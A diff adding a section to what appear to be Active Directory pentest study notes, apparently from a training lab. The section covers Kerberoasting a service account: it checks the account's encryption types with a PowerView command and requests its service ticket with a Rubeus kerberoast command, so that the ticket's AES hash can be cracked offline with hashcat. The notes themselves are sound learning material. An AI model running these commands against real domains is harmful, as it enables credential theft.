@@ -355,5 +355,22 @@ The **msDS-SupportedEncryptionTypes** attribute uses a single HEX value to def
 
 THE ABOVE TABLE SHOWS US WHAT THE USER ACCOUNT SUPPORTS IF THE VALUE OF msDS-SupportedEncryptionTypes is 28 that user account allows rc4 and aes both , but if the value is 24 only aes will be issued by KDC bcz it cannot downgrade as per the value , so it mean we can request rc4 if the value is 28 or 4 or 0 or wherever we see rc4 in table
 
+#### CRACKING AES TGS WITH HASHCAT 
+**USING POWERVIEW TO GET THE VALUE OF THE ENCRYPTION TYPE**
+
+```
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+serviceprincipalname                   msds-supportedencryptiontypes samaccountname
+--------------------                   ----------------------------- --------------
+testspn/kerberoast.inlanefreight.local                            24 testspn
+```
+
+Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.
+
+```POWERSHELL
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
 
 
